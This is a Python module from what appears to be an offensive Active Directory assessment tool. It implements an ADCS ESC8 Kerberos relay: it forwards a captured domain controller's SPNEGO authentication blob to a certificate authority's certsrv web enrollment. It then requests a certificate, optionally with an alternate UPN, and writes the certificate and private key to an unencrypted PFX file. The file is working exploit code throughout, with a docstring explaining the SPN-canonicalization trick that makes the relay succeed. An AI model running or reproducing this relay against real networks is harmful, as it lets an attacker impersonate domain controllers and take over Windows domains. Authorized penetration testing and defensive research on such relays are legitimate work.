"""ADCS ESC8 Kerberos relay target — opaque forward to certsrv.

Flow:
  1. Receive raw SPNEGO bytes captured from the victim DC's SMB SESSION_SETUP.
  2. Forward the blob opaquely to certsrv via HTTP ``Authorization: Negotiate``.
     IIS on the CA decrypts the ticket with its own machine account key — no
     decryption needed on the attacker side.
  3. Submit a CSR and retrieve the issued certificate.

The blob arrives already encrypted with the CA machine account's Kerberos key
because the DNS relay alias is prefixed with the CA hostname (_ca_short_hostname
trick), causing Windows SPN canonicalization to use ``cifs/<ca>.<domain>`` which
is registered on the CA machine account.

References:
  mayfly277 ESC8 Kerberos relay: https://mayfly277.github.io/posts/ADCS-part14/
  krbrelayx opaque relay:        https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
"""

from __future__ import annotations

import base64
import os

from adscan_core import telemetry
from adscan_internal.rich_output import print_info_debug, print_success
from adscan_internal.services.adcs.esc_cleanup import format_certificate_not_after
from adscan_internal.services.relay.adcs_esc8 import (
    AdcsEsc8RelayConfig,
    _AdcsWebEnrollmentClient,
    _build_csr_pem,
    _load_certificate,
)
from adscan_internal.services.relay.core import RelayTargetResult
from adscan_internal.services.relay.display import print_relay_captured
from adscan_core.rich_output import print_exception


class AdcsEsc8KrbRelayTarget:
    """Relay target: SMB Kerberos blob → opaque forward to certsrv → certificate."""

    name = "adcs-esc8-krb"
    technique = "ADCSESC8-KRB"

    def __init__(self, config: AdcsEsc8RelayConfig) -> None:
        self.config = config

    async def run(self, spnego_bytes: bytes) -> RelayTargetResult:
        """Forward captured Kerberos SPNEGO blob to certsrv and retrieve cert."""
        is_ntlm = spnego_bytes[:7] == b"NTLMSSP"
        proto = "NTLM" if is_ntlm else "Kerberos"

        ca_display = self.config.ca_fqdn or self.config.ca_host
        print_relay_captured(f"DC ({proto} SMB auth)", ca_display, self.technique)
        print_info_debug(f"[ESC8-KRB] blob size={len(spnego_bytes)} proto={proto}")

        client = _AdcsWebEnrollmentClient(self.config)
        try:
            await client.connect()
            await _authenticate_opaque(client, spnego_bytes)

            key, csr_pem = _build_csr_pem(
                common_name=f"esc8krb-{os.urandom(3).hex()}",
                alt_upn=self.config.alt_upn,
                key_size=self.config.key_size,
            )
            attributes = [f"CertificateTemplate:{self.config.template}"]
            if self.config.alt_upn:
                attributes.append(f"SAN:upn={self.config.alt_upn}")

            request_id, cert_bytes = await client.request_certificate(
                csr_pem=csr_pem,
                attributes="\r\n".join(attributes),
            )
        except Exception as exc:
            telemetry.capture_exception(exc)
            print_exception(exception=exc)
            return RelayTargetResult(
                target_name=self.name,
                success=False,
                technique=self.technique,
                principal=None,
                error=f"certsrv Kerberos relay failed: {exc}",
            )
        finally:
            await client.close()

        if not cert_bytes:
            return RelayTargetResult(
                target_name=self.name,
                success=False,
                technique=self.technique,
                principal=None,
                error=f"certsrv returned no cert (request_id={request_id})",
                metadata={"request_id": request_id},
            )

        cert = _load_certificate(cert_bytes)
        self.config.output_dir.mkdir(parents=True, exist_ok=True)
        pfx_path = self.config.output_dir / f"esc8krb_{os.urandom(4).hex()}.pfx"

        from cryptography.hazmat.primitives.serialization import pkcs12, NoEncryption
        pfx_bytes = pkcs12.serialize_key_and_certificates(
            name=b"esc8krb",
            key=key,
            cert=cert,
            cas=None,
            encryption_algorithm=NoEncryption(),
        )
        pfx_path.write_bytes(pfx_bytes)

        subject = cert.subject.rfc4514_string()
        print_success(f"[ESC8-KRB] Certificate issued: {subject}")

        return RelayTargetResult(
            target_name=self.name,
            success=True,
            technique=self.technique,
            principal=subject,
            artifact_paths=(str(pfx_path),),
            metadata={
                "request_id": request_id,
                "cert_serial": f"{cert.serial_number:X}",
                "cert_subject": subject,
                "cert_not_after": format_certificate_not_after(cert),
                "template": self.config.template,
                "endpoint": client.endpoint,
            },
        )


async def _authenticate_opaque(
    client: _AdcsWebEnrollmentClient,
    spnego_bytes: bytes,
) -> None:
    """Authenticate to certsrv by forwarding the captured Kerberos blob as-is.

    IIS on the CA decrypts the ticket using its own machine account key — the
    attacker never needs to decrypt anything.
    """
    initial = await client._request("GET", "/certsrv/certfnsh.asp")
    if initial.status == 200:
        return  # already authenticated (shouldn't happen, but handle it)
    if initial.status != 401:
        raise RuntimeError(
            f"certsrv returned unexpected status {initial.status} on initial GET "
            f"(expected 401 Unauthorized)"
        )

    b64 = base64.b64encode(spnego_bytes).decode()
    auth_resp = await client._request(
        "GET",
        "/certsrv/certfnsh.asp",
        headers={"Authorization": f"Negotiate {b64}"},
    )
    if auth_resp.status == 401:
        raise RuntimeError(
            "certsrv rejected the Kerberos token (401). "
            "Verify the relay alias prefix matches the CA hostname so that "
            "the DC's Kerberos ticket targets the CA machine account SPN."
        )
